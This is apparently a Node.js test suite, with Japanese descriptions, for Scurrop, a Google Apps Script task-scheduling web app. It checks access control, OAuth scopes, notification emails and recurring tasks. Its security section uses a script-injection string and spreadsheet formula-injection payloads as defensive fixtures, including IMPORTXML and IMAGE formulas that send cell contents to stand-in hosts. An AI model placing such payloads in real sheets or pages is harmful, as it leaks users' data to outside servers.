  ok('上限に当たっても、少し待ってもう一度試すと作れることがある（そのまま Meet が付く）', /^https:\/\/meet\.google\.com\//.test(task(st, '1 回目だけ上限').meetUrl) && e38.slept === 1500 && !st.notice);
  e38.meetRate = 2;
  st = a38.createTask({ title: 'ずっと上限', member: 'sato@example.com', start: at(10), end: at(11), meet: true });
  const tR = task(st, 'ずっと上限');
  ok('上限が続くあいだは、エラーにせず「あとで付く」と知らせる。タスクと予定はできている', tR.hasEvent && tR.meet === true && tR.meetUrl === '' && cell(tR.id) === 'retry' && /Meet リンクは後ほど発行されます/.test(st.notice) && !/作成できませんでした/.test(st.notice));
  e38.meetRate = 1;
  st = a38.getState();
  ok('まだ上限のあいだは、管理者が開いても付かない（次に回す）', task(st, 'ずっと上限').meetUrl === '' && cell(tR.id) === 'retry');
  st = a38.getState();
  ok('上限が明けたら、管理者が開いたときに自動で付く', /^https:\/\/meet\.google\.com\//.test(task(st, 'ずっと上限').meetUrl));
  ok('上限に当たった直後（同じ操作のなか）では、やり直さない', (() => { e38.meetRate = 2; const c = e38.reads.cal; const x = a38.createTask({ title: '直後', member: 'sato@example.com', start: at(13), end: at(14), meet: true }); return task(x, '直後').meetUrl === '' && /後ほど発行されます/.test(x.notice) && e38.meetRate === 0; })());
  a38.getState();
  e38.meetRate = 2;
  st = a38.createTask({ title: 'べつの失敗', member: 'sato@example.com', start: at(11), end: at(12), meet: true });
  e38.meetFail = true;
  st = a38.getState();
  ok('やり直しで、上限ではない失敗になったら、やり直しをやめる（付けることは覚えている）', cell(task(st, 'べつの失敗').id) === 'on' && task(st, 'べつの失敗').meet === true);
  e38.meetFail = false;
  e38.user = 'sato@example.com'; e38.meetRate = 0;
  const c0 = e38.reads.cal; a38.getState();
  ok('メンバーが開いたときは、やり直さない', e38.reads.cal === c0);
}

// 最初の状態を、ページと一緒に返す（ページを開くときの往復を 1 回減らす）
{
  const e39 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a39 = e39.api; e39.now = at(8);
  const b0 = JSON.parse(a39.doGet({ parameter: {} }).boot);
  ok('始める前のページにも、最初の状態（初回ページ用）が入る', b0.state && b0.state.setup === true && b0.state.canSetup === true);
  a39.initProject({ name: '訪問サービス' });
  a39.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a39.createTask({ title: '秘密のタスク', member: 'sato@example.com', start: at(9), end: at(10), memo: '暗証番号 1234' });
  e39.autoJoin = false; a39.addMember({ email: 'guest@gmail.com', name: '外の人', board: '' });
  const key = (e39.mails[e39.mails.length - 1].body.match(/[?&]k=([A-Za-z0-9._-]+)/) || [])[1];
  const strip = (st) => { const o = JSON.parse(JSON.stringify(st)); delete o.tookMs; delete o.clock; delete o.now; return JSON.stringify(o); };
  e39.reads.batch = 0; e39.reads.sheets = 0;
  let b = JSON.parse(a39.doGet({ parameter: {} }).boot);
  ok('管理者のページには、最初の状態が入っている（あとから取りに来なくてよい）', b.state && b.state.me.role === 'admin' && b.state.tasks.length === 1 && strip(b.state) === strip(a39.getState()));
  ok('そのとき、シートを読むのは 1 回の呼び出しだけ', (() => { e39.reads.batch = 0; e39.reads.sheets = 0; a39.doGet({ parameter: {} }); return e39.reads.batch === 1 && e39.reads.sheets === 0; })());
  e39.user = 'sato@example.com';
  b = JSON.parse(a39.doGet({ parameter: {} }).boot);
  ok('メンバーのページには、その人の分だけの状態が入る', b.state.me.role === 'member' && b.state.tasks.length === 1 && b.state.members.length === 1 && b.state.sheetUrl === '');
  e39.user = '';
  b = JSON.parse(a39.doGet({ parameter: { k: key } }).boot);
  ok('招待中の人（鍵つきのリンク）のページには、参加の画面に要るものだけが入る', b.state.me.role === 'invited' && b.state.tasks.length === 0 && b.state.invite.project === '訪問サービス' && !JSON.stringify(b.state).includes('秘密'));
  const pg = a39.doGet({ parameter: {} });
  ok('だれか分からない人のページには、状態は入らない（タスクもプロジェクト名も出ない）', JSON.parse(pg.boot).state === null && !pg.boot.includes('秘密') && !pg.boot.includes('訪問サービス') && !pg.boot.includes('暗証'));
  e39.user = 'someone@example.com';
  b = JSON.parse(a39.doGet({ parameter: {} }).boot);
  ok('登録のない人のページには、「登録されていません」を出すのに要るものだけが入る', b.state.me.role === 'guest' && b.state.tasks.length === 0 && b.state.project.name === '' && !JSON.stringify(b).includes('秘密'));
  e39.user = 'admin@example.com';
  a39.createTask({ title: '</script><script>alert(1)</script>', member: '', start: at(11), end: at(12) });
  ok('タスク名に「</script>」が入っていても、ページの中の <script> を閉じられない', !/<\/script>/i.test(a39.doGet({ parameter: {} }).boot) && JSON.parse(a39.doGet({ parameter: {} }).boot).state.tasks.some(t => t.title === '</script><script>alert(1)</script>'));
}

// 公開範囲（URL を知っている人全員。既定で公開）
{
  const mf = JSON.parse(require('fs').readFileSync(__dirname + '/../src/appsscript.json', 'utf8'));
  ok('Web アプリは、URL を知っている人全員が開ける設定で、公開した本人として動く', mf.webapp.access === 'ANYONE_ANONYMOUS' && mf.webapp.executeAs === 'USER_DEPLOYING');
  ok('権限は 7 つ: シート・カレンダー・ドライブ（このアプリが作ったファイルだけ）・メールの送信（予備）・Gmail で送るだけ・時間で動かす・アドレスの確認', mf.oauthScopes.join() === ['spreadsheets', 'calendar', 'drive.file', 'script.send_mail', 'gmail.send', 'script.scriptapp', 'userinfo.email'].map(x => 'https://www.googleapis.com/auth/' + x).join());
  ok('ドライブ全体を見られる権限（drive、drive.readonly）は求めない。DriveApp も使わない', !mf.oauthScopes.some(x => /auth\/drive(\.readonly|\.metadata[a-z.]*)?$/.test(x)) && !/DriveApp/.test(require('fs').readFileSync(__dirname + '/../src/Code.gs', 'utf8')));
  ok('メールを読める権限（mail.google.com など）は求めない。GmailApp も使わない', !mf.oauthScopes.some(x => /mail\.google\.com|gmail\.(modify|readonly|compose)/.test(x)) && !/GmailApp/.test(require('fs').readFileSync(__dirname + '/../src/Code.gs', 'utf8')));
  ok('Gmail・Sheets・Calendar・Drive のサービスを使う設定が入っている', JSON.stringify(mf.dependencies.enabledAdvancedServices) === JSON.stringify([{ userSymbol: 'Gmail', serviceId: 'gmail', version: 'v1' }, { userSymbol: 'Sheets', serviceId: 'sheets', version: 'v4' }, { userSymbol: 'Calendar', serviceId: 'calendar', version: 'v3' }, { userSymbol: 'Drive', serviceId: 'drive', version: 'v3' }]));
  const e17 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a17 = e17.api; e17.now = at(8);
  a17.initProject({ name: '訪問サービス' });
  a17.createTask({ title: '秘密のタスク', member: '', start: at(9), end: at(10), memo: '暗証番号 1234' });
  e17.user = '';
  const pg = a17.doGet({ parameter: { task: 'abc' } });
  ok('ログインしていない人にも、ページそのものは返る（中身は空）', pg.title === 'Scurrop' && JSON.parse(pg.boot).icon === '' && !pg.boot.includes('訪問サービス') && !pg.boot.includes('秘密'));
  ok('ログインしていない人のページには、ログインして戻ってくるための URL が入る', /^https:\/\/script\.google\.com\//.test(JSON.parse(pg.boot).self));
  throws('ログインしていない人は、状態を読めない', () => a17.getState(), /アカウントを確認できません/);
  throws('ログインしていない人は、状態を読めない（鍵らしきものを付けても）', () => a17.getState({ key: 'nabc.def' }), /アカウントを確認できません/);
  throws('ログインしていない人は、タスクを作れない', () => a17.createTask({ title: 'x', start: at(9), end: at(10) }), /アカウントを確認できません/);
  throws('ログインしていない人は、タスクを動かせない', () => a17.updateTask('k0000000', 'done', {}), /アカウントを確認できません/);
  throws('ログインしていない人は、メンバーを足せない', () => a17.addMember({ email: 'x@gmail.com', name: 'x' }), /アカウントを確認できません/);
  throws('ログインしていない人は、リセットできない', () => a17.resetProject(), /アカウントを確認できません/);
  throws('ログインしていない人は、予備の入口 setup も使えない', () => a17.setup(), /デプロイしたアカウント/);
  throws('ログインしていない人は、メールの確認も使えない', () => a17.testMail(), /アカウントを確認できません/);
  ok('ログインしていない人には、写真もアイコンも返らない', (() => { try { a17.getPhotos(['admin@example.com']); return false; } catch (err) { return true; } })() && a17.getIcon().data === '');
  e17.user = 'someone@gmail.com';
  ok('ほかの組織のアカウントでログインしていても、登録がなければ何も渡らない', a17.getState().me.role === 'guest' && a17.getState().tasks.length === 0 && a17.getState().project.name === '');
}

// セキュリティ
{
  const e9 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a9 = e9.api; e9.now = at(8);
  a9.initProject({ name: '訪問サービス' });
  a9.addMember({ email: 'sato@example.com', name: '佐藤', board: '訪問' });
  a9.addMember({ email: 'suzuki@example.com', name: '鈴木', board: '訪問' });
  // 予備の入口 setup から、ほかの人が自分を管理者にできない
  e9.user = 'suzuki@example.com';
  throws('公開した本人以外は setup を呼べない（メンバーが自分を管理者にできない）', () => a9.setup(), /デプロイしたアカウント/);
  e9.user = 'stranger@example.com';
  throws('未登録の人も setup を呼べない', () => a9.setup(), /デプロイしたアカウント/);
  ok('setup を呼ばれても、管理者は増えていない', (() => { e9.user = 'admin@example.com'; const m = a9.getState().members; return m.length === 3 && m.filter(x => x.role === 'admin').length === 1; })());
  // 未登録の人に渡るもの
  e9.user = 'stranger@example.com';
  let r = a9.getState();
  ok('未登録の人には、プロジェクト名・ボード・メンバー・タスクを何も返さない', r.me.role === 'guest' && r.project.name === '' && r.boards.length === 0 && r.members.length === 0 && r.tasks.length === 0 && r.url === '' && r.shiftUsers.length === 0);
  ok('未登録の人のページには、プロジェクト名もアイコンも入らない', a9.doGet({}).title === 'Scurrop' && JSON.parse(a9.doGet({}).boot).icon === '' && a9.getIcon().data === '');
  throws('未登録の人は何も操作できない', () => a9.createTask({ title: 'x', start: at(9), end: at(10) }), /管理者/);
  e9.user = '';
  throws('アカウントが分からない人は中に入れない', () => a9.getState(), /アカウントを確認できません/);
  ok('アカウントが分からない人のページにも、プロジェクト名は入らない', a9.doGet({}).title === 'Scurrop');
  // ほかの人のタスクのリンク
  e9.user = 'admin@example.com';
  r = a9.createTask({ title: '佐藤の訪問', member: 'sato@example.com', start: at(9), end: at(10), memo: '暗証番号は 1234' });
  const secret = r.tasks[0];
  ok('予定は非公開で作られる', e9.events[0].visibility === 'PRIVATE');
  e9.user = 'suzuki@example.com';
  r = a9.getState();
  ok('ほかのメンバーには、そのタスクは届かない（リンクを知っていても見えない）', r.tasks.length === 0 && !JSON.stringify(r).includes('暗証番号') && !JSON.stringify(r).includes(secret.id));
  throws('ほかのメンバーは、そのタスクを開始できない', () => a9.updateTask(secret.id, 'start', {}), /担当ではありません/);
  throws('ほかのメンバーは、そのタスクを完了できない', () => a9.updateTask(secret.id, 'done', {}), /担当ではありません/);
  e9.user = 'admin@example.com';
  // ページに埋め込む文字
  ok('ページに埋め込む文字に「<」が生で入らない', !a9.doGet({ parameter: { task: 'a</script><script>alert(1)</script>' } }).boot.includes('<'));
  // スプレッドシートに式を書き込ませない
  r = a9.createTask({ title: '=IMPORTXML("https://evil.example/?"&A1,"//a")', member: 'sato@example.com', start: at(11), end: at(12), memo: '+1+1' });
  const f1 = r.tasks.filter(t => /IMPORTXML/.test(t.title))[0];
  ok('「=」で始まるタスク名やメモは、式にならず文字のまま保存される', !!f1 && f1.title === '=IMPORTXML("https://evil.example/?"&A1,"//a")' && f1.memo === '+1+1' && e9.formulas.length === 0);
  e9.user = 'sato@example.com';
  a9.updateTask(f1.id, 'start', { note: '=HYPERLINK("https://evil.example","x")' });
  r = a9.updateTask(f1.id, 'done', { note: '@SUM(1)', geoError: '=1+1' });
  ok('メンバーが入れたメモも、式にならず文字のまま保存される', r.tasks.filter(t => t.id === f1.id)[0].note === '@SUM(1)' && e9.formulas.length === 0 && r.history.some(h => /=HYPERLINK/.test(h.note)));
  e9.user = 'admin@example.com';
  r = a9.createTask({ title: '007', member: '', start: at(13), end: at(14), memo: '9:30' });
  ok('数字や時刻に見える文字も、そのまま保存される（先頭の 0 が消えない）', r.tasks.some(t => t.title === '007' && t.memo === '9:30'));
  r = a9.updateMember('sato@example.com', { name: '=cmd', role: 'member', board: '訪問' });
  ok('名前などの上書きでも式にならない', r.members.filter(m => m.email === 'sato@example.com')[0].name === '=cmd' && e9.formulas.length === 0);
  ok('ID は必ず文字で始まる（数として読み替えられない）', r.tasks.every(t => /^k[0-9a-f]{7}$/.test(t.id)) && r.rules.every(x => /^k/.test(x.id)));
  ok('試し書きのシートは残らず、結果が覚えられている', e9.props.TEXT_MODE === 'apos' && !Object.keys(e9.sheets).some(k => /^_probe_/.test(k)));
  // ' が効かない環境では、何も付けない（文字が壊れないほうを優先）
  const e10 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a10 = e10.api; e10.now = at(8); e10.noApos = true;
  a10.initProject({ name: 'x' });
  r = a10.createTask({ title: '-5', member: '', start: at(9), end: at(10) });
  ok('先頭の \' が効かない環境では付けない（余計な \' が見えない）', e10.props.TEXT_MODE === 'none' && !e10.sheets.tasks._d.some(row => row.some(c => typeof c === 'string' && c[0] === "'")));
  // 式として動く始まり方だけは、' が効かない環境でも必ず付ける（' が見えるほうが、式が動くよりよい）
  r = a10.createTask({ title: '=IMAGE("https://x.example/?"&members!A2)', member: '', start: at(11), end: at(12), memo: '+SUM(A1:A9)' });
  ok('\' が効かない環境でも、式で始まる文字は式にしない', e10.formulas.length === 0 && e10.sheets.tasks._d.some(row => row.indexOf("'=IMAGE(\"https://x.example/?\"&members!A2)") >= 0) && e10.sheets.tasks._d.some(row => row.indexOf("'+SUM(A1:A9)") >= 0));
  // 試し書きそのものが失敗したとき（シートを足せない、など）: 結果を覚えず、' を付ける側に倒す
  const e11 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a11 = e11.api; e11.now = at(8);
  a11.initProject({ name: 'x' });
  e11.probeFail = true;
  r = a11.createTask({ title: '=1+1', member: '', start: at(9), end: at(10), memo: '007' });
  ok('試し書きに失敗しても、式にはならず、失敗を覚えこまない', e11.formulas.length === 0 && r.tasks[0].title === '=1+1' && !e11.props.TEXT_MODE);
  e11.probeFail = false;
  a11.createTask({ title: '008', member: '', start: at(11), end: at(12) });
  ok('次の機会に確かめ直して、結果を覚える', e11.props.TEXT_MODE === 'apos' && e11.formulas.length === 0);
}

// v0.6: 初回ページ（setup を実行しない入口）
{
  const e2 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a2 = e2.api;
  e2.user = 'sato@example.com';
  ok('公開した本人でなければ初回の設定はできない', a2.getState().setup === true && a2.getState().canSetup === false);
  throws('本人以外の initProject は拒否', () => a2.initProject({ name: 'テスト' }), /デプロイしたアカウント/);
  e2.user = '';
  ok('アカウントが分からない人にも初回ページは出るが、設定はできない', a2.getState().canSetup === false);
  e2.user = 'admin@example.com';
  throws('プロジェクト名は必須', () => a2.initProject({ name: '  ' }), /プロジェクト名/);
  throws('プロジェクト名は 30 文字まで', () => a2.initProject({ name: 'あ'.repeat(31) }), /30 文字/);
  const PX = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
  const BIG = 'data:image/jpeg;base64,' + 'A'.repeat(20000); // 分けて保存されることを確かめる大きさ
  throws('画像でないアイコンは拒否（リンク）', () => a2.initProject({ name: 'テスト', icon: 'https://example.com/a.png' }), /アイコン/);
  throws('画像でないアイコンは拒否（SVG やスクリプト入り）', () => a2.initProject({ name: 'テスト', icon: 'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=' }), /アイコン/);
  throws('大きすぎるアイコンは拒否', () => a2.initProject({ name: 'テスト', icon: 'data:image/png;base64,' + 'A'.repeat(60001) }), /アイコン/);
  const HAM_FAV = require('fs').readFileSync(__dirname + '/../src/Code.gs', 'utf8').match(/const HAM_FAV = '([^']+)'/)[1];
  const HAM_MAIL = require('fs').readFileSync(__dirname + '/../src/Code.gs', 'utf8').match(/const HAM_MAIL = '([^']+)'/)[1];
  const ham = require('./ham.js');
  ok('ファビコン用の画像（HAM_FAV）は index.html の HAM と同じ絵の 48px', ham.fromPng(HAM_FAV).size === 48 && ham.fromPng(HAM_FAV).px.equals(ham.hamPixels(3).px));
  ok('メール用の画像（HAM_MAIL）は同じ絵の 128px', ham.fromPng(HAM_MAIL).size === 128 && ham.fromPng(HAM_MAIL).px.equals(ham.hamPixels(8).px));
  e2.noActive = 'throw';
  throws('スプレッドシートを取れないときは setup に案内する（例外でも）', () => a2.initProject({ name: 'テスト' }), /setup を実行/);
  e2.noActive = true;
  throws('スプレッドシートを取れないときは setup に案内する（空でも）', () => a2.initProject({ name: 'テスト' }), /setup を実行/);
  e2.noActive = false;
  ok('失敗した間は何も作られない', !e2.props.SHEET_ID && Object.keys(e2.sheets).length === 0);
  ok('何も決めていなければ、ファビコンは Google のハムスターの絵文字（始める前のページにも付く）', JSON.parse(a2.doGet({}).boot).icon === '' && JSON.parse(a2.doGet({}).boot).fav === 'ok' && a2.doGet({}).favicon === 'https://fonts.gstatic.com/s/e/notoemoji/15.0/1f439/72.png');
  e2.props.FAVICON_URL = 'data:image/png;base64,AAAA';
  ok('画像を文字にした URL は使わない（実機で断られるため）。絵文字に戻る', a2.doGet({}).favicon === 'https://fonts.gstatic.com/s/e/notoemoji/15.0/1f439/72.png');
  e2.props.FAVICON_URL = 'https://example.com/page';
  ok('.png で終わらない URL は使わない。絵文字に戻る', a2.doGet({}).favicon === 'https://fonts.gstatic.com/s/e/notoemoji/15.0/1f439/72.png');
  e2.props.FAVICON_URL = 'https://example.com/assets/scurrop-48.png';
  ok('自分で置いた公開の .png の URL を決めると、そちらが使われる', a2.doGet({}).favicon === 'https://example.com/assets/scurrop-48.png' && JSON.parse(a2.doGet({}).boot).fav === 'ok');
  let r = a2.initProject({ name: 'あ'.repeat(30), icon: BIG, fav: PX });
  ok('初回ページから始められる（データのシート 11 枚と URL のシート、本人が管理者、名前）', !r.setup && r.me.role === 'admin' && Object.keys(e2.sheets).length === 12 && !!e2.sheets.URL && r.project.name === 'あ'.repeat(30) && r.rules.length === 6);
  ok('アイコンは分けて保存され、元どおり読める。15 秒おきの更新には番号だけ載る', e2.props.PROJECT_ICON_N === '3' && a2.getIcon().data === BIG && a2.getIcon().rev === r.project.iconRev && !!r.project.iconRev && r.project.icon === undefined);
  let pg = a2.doGet({ parameter: { task: 'abc-1<x>' } });
  ok('ページを返すとき、プロジェクトのアイコンが付き、ファビコンは Scurrop のしるし（選んだ画像にはならない）', JSON.parse(pg.boot).icon === BIG && JSON.parse(pg.boot).task === 'abc-1x' && JSON.parse(pg.boot).fav === 'ok' && pg.favicon === 'https://example.com/assets/scurrop-48.png' && e2.props.PROJECT_FAV_N === '0');
  ok('?fav=0 ではファビコンを試さない', !a2.doGet({ parameter: { fav: '0' } }).favicon && JSON.parse(a2.doGet({ parameter: { fav: '0' } }).boot).fav === 'なし');
  e2.favFail = true; pg = a2.doGet({});
  ok('ファビコンが受け付けられなくてもページは返り、理由が診断に出る', !pg.favicon && /not supported/.test(JSON.parse(pg.boot).fav));
  e2.favFail = false;
  throws('二度目の initProject は拒否', () => a2.initProject({ name: '別' }), /設定済み/);
  const rev0 = r.project.iconRev; e2.now = Date.now() + 5000;
  r = a2.setProject({ name: '訪問サービス', icon: PX, fav: PX });
  ok('プロジェクトの設定で名前とアイコンを変えられる（番号が進み、古い分割は消える）', r.project.name === '訪問サービス' && a2.getIcon().data === PX && r.project.iconRev !== rev0 && e2.props.PROJECT_ICON_N === '1' && e2.props.PROJECT_ICON_1 === undefined);
  r = a2.setProject({ name: '訪問サービス', icon: '', fav: PX });
  ok('アイコンを空にすると頭文字に戻る（ファビコンは Scurrop のしるしのまま）', a2.getIcon().data === '' && a2.doGet({}).favicon === 'https://example.com/assets/scurrop-48.png');
  e2.user = 'stranger@example.com';
  ok('登録されていない人のページにも、ファビコンは Scurrop のしるしが付く（プロジェクトのアイコンは付かない）', a2.doGet({}).favicon === 'https://example.com/assets/scurrop-48.png' && JSON.parse(a2.doGet({}).boot).icon === '');
  e2.user = 'admin@example.com';
  e2.now = 0;
  throws('設定でも 30 文字を超える名前は拒否', () => a2.setProject({ name: 'x'.repeat(31) }), /30 文字/);
  ok('公開した本人の管理者にはリセットできる印が付く', a2.getState().canSetup === true);
  a2.addMember({ email: 'sato@example.com', name: '佐藤', board: '訪問' });
  a2.createTask({ title: '訪問', member: 'sato@example.com', start: at(9), end: at(10) });
  e2.user = 'sato@example.com';
  throws('メンバーはリセットできない', () => a2.resetProject(), /管理者/);
  e2.user = 'admin@example.com'; e2.owner = 'other@example.com';
  throws('公開した本人でない管理者はリセットできない', () => a2.resetProject(), /デプロイしたアカウント/);
  e2.owner = 'admin@example.com';
  r = a2.resetProject();
  ok('リセットすると初回ページに戻り、データのシートとプロジェクトの設定が消える（URL のシートと、これまでの URL は残る。ファビコンの置き場所は環境の設定なので残る）', r.setup === true && Object.keys(e2.props).sort().join() === 'FAVICON_URL,URL_LIST' && Object.keys(e2.sheets).join() === 'URL' && !e2.sheets.tasks && a2.doGet({}).favicon === 'https://example.com/assets/scurrop-48.png');
  r = a2.initProject({ name: 'やり直し' });
  ok('リセットのあと、初回ページからやり直せる（データは空）', r.project.name === 'やり直し' && r.members.length === 1 && r.tasks.length === 0 && r.rules.length === 6);
  e2.user = 'sato@example.com';
  ok('始まったあとは、他の人には未登録の案内になる', a2.getState().me.role === 'guest' && !a2.getState().setup);
}

// タスクの一覧を週・月で見る（v0.49）
{
  const e = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a2 = e.api; e.now = at(8, 0); a2.setup();
  a2.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  const tp = a2.saveTemplate({ name: '点検', board: '', minutes: 60, fields: [{ label: '台数', type: 'number', required: false }] }).templates[0];
  a2.createTask({ title: '今日', member: 'sato@example.com', start: at(9), end: at(10), templateId: tp.id });
  a2.createTask({ title: '明日', member: 'sato@example.com', start: at(9) + 86400000, end: at(10) + 86400000 });
  a2.createTask({ title: '来月', member: '', start: at(9) + 40 * 86400000, end: at(10) + 40 * 86400000 });
  let st = a2.getState({ span: 'month', list: true });
  const inMonth = [0, 1].filter(n => new Date(at(9) + n * 86400000).getMonth() === new Date(at(9)).getMonth()).length;
  ok('月で一覧を頼むと、その月のタスクが中身ごと返る（今日の分は tasks にそのまま）', st.tasks.length === 1 && st.list.length === inMonth && st.list[0].fields.length === 1 && st.list.every(t => t.title !== '来月'));
  ok('タスクに、テンプレートの名前と id が付く', st.tasks[0].template === '点検' && st.tasks[0].templateId === tp.id && a2.getState().tasks[0].template === '点検');
  ok('頼まなければ list は返らない（ボードの週・月はこれまでどおり要約だけ）', a2.getState({ span: 'month' }).list === null && a2.getState({ list: true }).list === null && a2.getState({ span: 'week' }).week.length === 7);
  e.user = 'sato@example.com';
  ok('メンバーには list を渡さない', a2.getState({ span: 'month', list: true }).list === null);
}

// 割り当て・完了のメール、繰り返しのタスク（v0.50）
{
  const e = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a2 = e.api; e.now = at(8, 0); a2.setup();
  a2.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a2.addMember({ email: 'suzuki@example.com', name: '鈴木 陽菜', board: '' });
  const tp = a2.saveTemplate({ name: '点検', board: '', minutes: 60, fields: [{ label: '台数', type: 'number', required: false }, { label: '結果', type: 'multi', required: false, options: ['良', '要修理'] }] }).templates[0];
  let n = e.mails.length;
  let st = a2.createTask({ title: '空調点検', member: 'sato@example.com', start: at(9), end: at(10), templateId: tp.id, address: '中央区 第一ビル', memo: '裏口から' });
  const tA = st.tasks[0].id;
  let m = e.mails[n];
  ok('メンバーを決めてタスクを作ると、その人に「割り当て」のメールが届く（住所・メモ・タスクを開くリンクつき）', e.mails.length === n + 1 && m.to === 'sato@example.com' && /^割り当て: 空調点検 9:00–10:00（佐藤 美咲）$/.test(m.subject) && /住所: 中央区 第一ビル/.test(m.body) && /メモ: 裏口から/.test(m.body) && m.body.includes('?task=' + tA) && /割り当て/.test(m.options.htmlBody));
  ok('履歴に、知らせたことが残る', st.history.some(h => h.action === 'rule' && /割り当て → 佐藤 美咲/.test(h.note)));
  n = e.mails.length;
  a2.createTask({ title: '自分の仕事', member: 'admin@example.com', start: at(9), end: at(10) });
  ok('自分で自分に割り当てたときは、メールを送らない', e.mails.length === n);
  st = a2.createTask({ title: '明日の点検', member: '', start: at(9) + 86400000, end: at(10) + 86400000 });
  const tFree = a2.getState({ day: (() => { const d = new Date(at(0) + 86400000); return d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0'); })() }).tasks[0].id;
  n = e.mails.length;
  a2.assignTask(tFree, 'suzuki@example.com');
  ok('未割り当てのタスクを割り当てても届く。先の日のタスクには、日付と曜日が付く', e.mails.length === n + 1 && e.mails[n].to === 'suzuki@example.com' && /^割り当て: 明日の点検 \d+\/\d+（.） 9:00–10:00（鈴木 陽菜）$/.test(e.mails[n].subject));
  n = e.mails.length;
  a2.editTask(tA, { title: '空調点検', member: 'suzuki@example.com', start: at(9), end: at(10), memo: '裏口から', address: '中央区 第一ビル' });
  ok('ほかの人に変えると、新しい人に届く', e.mails.length === n + 1 && e.mails[n].to === 'suzuki@example.com' && /^割り当て: 空調点検/.test(e.mails[n].subject));
  n = e.mails.length;
  a2.editTask(tA, { title: '空調点検', member: 'suzuki@example.com', start: at(9, 30), end: at(10, 30), memo: '裏口から', address: '中央区 第一ビル' });
  ok('時間だけ変えたときは、割り当てのメールは出ない', e.mails.length === n);
  // 完了の知らせ
  e.user = 'suzuki@example.com'; e.now = at(9, 32); a2.updateTask(tA, 'start', {});
  n = e.mails.length; e.now = at(10, 20);
  a2.updateTask(tA, 'done', { note: '異音あり', values: { [tp.fields[0].key]: 6, [tp.fields[1].key]: ['良', '要修理'] } });
  m = e.mails[n];
  ok('完了すると、管理者に「完了」のメールが届く。報告の中身（稼働・報告メモ・フィールドの値）が入る', e.mails.length === n + 1 && m.to === 'admin@example.com' && /^完了: 空調点検/.test(m.subject) && /稼働: 9:32–10:20（48 分）/.test(m.body) && /報告メモ: 異音あり/.test(m.body) && /台数: 6/.test(m.body) && /結果: 良・要修理/.test(m.body) && /48 分/.test(m.options.htmlBody));
  e.user = 'admin@example.com';
  const tB = a2.createTask({ title: '管理者が閉じる', member: 'sato@example.com', start: at(11), end: at(12) }).tasks.filter(t => t.title === '管理者が閉じる')[0].id;
  n = e.mails.length;
  a2.updateTask(tB, 'done', {});
  ok('管理者が自分で完了にしたときは、その管理者には送らない', e.mails.length === n);
  // 前の版からの引き継ぎ
  const rs = a2.getState().rules;
  a2.deleteRule(rs.filter(r => r.when === 'assign')[0].id);
  { const d = e.sheets.rules._d; const i = d[0].indexOf('then'); d.forEach((row, k) => { if (k && row[d[0].indexOf('when')] === 'done') row[i] = 'notify_linked'; }); }
  { const d = e.sheets.rules._d; for (let k = d.length - 1; k > 0; k--) if (d[k][d[0].indexOf('when')] === 'edit') d.splice(k, 1); }
  delete e.props.RULES_REV; e.props.SCHEMA = '13';
  st = a2.getState();
  ok('前の版から使っているプロジェクトには、「割り当て → メンバー」「完了 → 管理者」（オン）と「変更 → メンバー」（オフ）の通知が 1 回だけ足される', st.rules.filter(r => r.when === 'assign' && r.enabled && r.then.join() === 'notify_member').length === 1 && st.rules.filter(r => r.when === 'done' && r.then.join() === 'notify_admin' && r.enabled).length === 1 && e.props.RULES_REV === '3' && e.sheets.tasks._d[0].indexOf('series') >= 0 && st.rules.filter(r => r.when === 'edit' && !r.enabled && r.then.join() === 'notify_member').length === 1);
  a2.deleteRule(st.rules.filter(r => r.when === 'assign')[0].id);
  e.props.SCHEMA = '13';
  ok('消した通知は、次の更新で勝手に戻らない', a2.getState().rules.filter(r => r.when === 'assign').length === 0);
  a2.addRule({ when: 'assign', then: ['notify_member'] });
}
{
  const e = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a2 = e.api; e.now = at(8, 0); a2.setup();
  a2.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  const ds = (ms) => { const d = new Date(ms); return d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0'); };
  const D = 86400000;
  const n = e.mails.length, ev0 = e.events.length;
  let st = a2.createTask({ title: '定期清掃', member: 'sato@example.com', start: at(9), end: at(10), repeat: 'daily', until: ds(at(0) + 9 * D), meet: false });
  const rows = () => e.sheets.tasks._d.slice(1).map(r => { const o = {}; e.sheets.tasks._d[0].forEach((k, i) => { o[k] = r[i]; }); return o; });
  let all = rows();
  ok('毎日の繰り返しで、終わりの日までのタスクがまとめてできる（同じ時刻、同じまとまりの id）', all.length === 10 && all.every(r => r.series && r.series === all[0].series && new Date(r.start_ms).getHours() === 9 && r.end_ms - r.start_ms === 3600000) && new Set(all.map(r => r.id)).size === 10 && /10 件のタスクを作成しました（毎日、\d+\/\d+ まで（10 件））/.test(st.notice));
  ok('カレンダーの予定は、いちどに全部は作らない（1 つ目と、続けて 4 つ。招待メールは送らない）。残りは「あとから」のしるし', e.events.length === ev0 + 5 && e.events[ev0].o.sendInvites === false && all.filter(r => r.event_id === 'wait').length === 5 && st.tasks[0].hasEvent && !st.tasks[0].eventWait && st.tasks[0].series === all[0].series);
  ok('割り当ての知らせは、まとめて 1 通（繰り返しの内容つき）', e.mails.length === n + 1 && /繰り返し: 毎日、\d+\/\d+ まで（10 件）/.test(e.mails[n].body) && e.mails[n].to === 'sato@example.com');
  ok('履歴は 1 行（繰り返しの内容つき）', st.history.filter(h => h.action === 'create').length === 1 && /繰り返し: 毎日/.test(st.history.filter(h => h.action === 'create')[0].note));
  st = a2.getState({ day: ds(at(0) + D) });
